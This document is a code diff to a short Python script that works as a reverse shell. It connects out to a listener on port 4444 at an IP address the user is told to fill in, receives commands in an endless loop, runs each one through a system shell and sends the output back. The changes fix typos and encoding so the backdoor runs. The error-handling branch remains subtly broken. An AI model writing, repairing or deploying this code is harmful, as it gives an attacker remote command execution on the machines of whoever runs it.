@@ -2,15 +2,19 @@ import socket
 import subprocess
 
 def execute(command):
-    subprocess.check_output(command, shell=True)
+    try:
+        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+        return result.decode()  # Decode the byte string to a regular string
+    except subprocess.CalledProcessError as e:
+        return str(e).encode()  # If there's an error, send the error message as a byte string
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STEAM)
-connection.connect(("192.168.210.64", 4444))
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connection.connect(("127.0.0.1", 4444)) #put your own machine ip
 
-connection.send("\n[+] Connection Established.\n")
+a = "connection established"
+connection.send(a.encode())
 while True:
-    recived_data = connection.recv(1024)
-    result = execute(recived_data)
-    connection.send(result)
-
-connection.close()
+    received_data = connection.recv(1024).decode()  # Decode the received data to a regular string
+    result = execute(received_data)
+    if result is not None:
+        connection.send(result.encode())  # Encode the result as a byte string before sending
